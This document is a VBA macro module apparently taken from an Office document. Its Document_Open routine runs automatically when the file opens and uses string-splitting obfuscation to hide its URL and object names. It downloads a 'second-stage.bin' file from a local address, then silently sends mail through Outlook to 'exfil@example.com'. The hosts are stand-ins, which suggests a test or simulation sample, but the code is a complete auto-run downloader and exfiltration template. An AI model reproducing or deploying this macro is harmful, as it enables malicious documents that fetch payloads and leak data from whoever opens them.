Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim http As Object, url As String
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    url = "http:" & "//127.0." & "0.1:90" & "90/sec" & "ond-sta" & "ge.bin"
    Set http = CreateObject("MSXML2" & ".XMLHT" & "TP")
    http.Open "GET", url, False
    http.Send
    Set olApp = CreateObject("Outl" & "ook.Appli" & "catio" & "n")
    Set olMail = olApp.CreateItem(0)
    olMail.To = "exfil@example.com"
    olMail.Subject = "logs"
    olMail.Body = http.Status
    olMail.Send
End Sub
